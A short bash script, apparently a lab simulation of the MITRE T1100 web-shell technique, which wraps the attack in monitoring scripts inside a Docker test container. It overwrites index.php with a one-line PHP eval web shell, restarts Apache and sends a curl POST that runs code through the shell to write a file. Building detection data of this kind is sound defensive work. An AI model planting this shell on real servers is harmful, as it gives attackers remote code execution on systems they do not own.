#!/bin/bash
BASEPATH=`dirname $0`/../input_T1100_WebShell/output_test
monitoring_scripts/monitoring.sh $BASEPATH
sleep 5
docker exec -it ubuntu-test-mitre sudo bash -c "echo '<?php @eval(\$_POST[password]);?>' > /var/www/html/index.php"
docker exec -it ubuntu-test-mitre sudo bash -c "service apache2 restart"
curl -d 'password=$fp=fopen("/tmp/attack.txt","w");fwrite($fp,"payload");fclose($fp);' -H "Content-Type: application/x-www-form-urlencoded" -XPOST 172.17.0.2/index.php
sleep 5
monitoring_scripts/killmonitoring.sh $BASEPATH
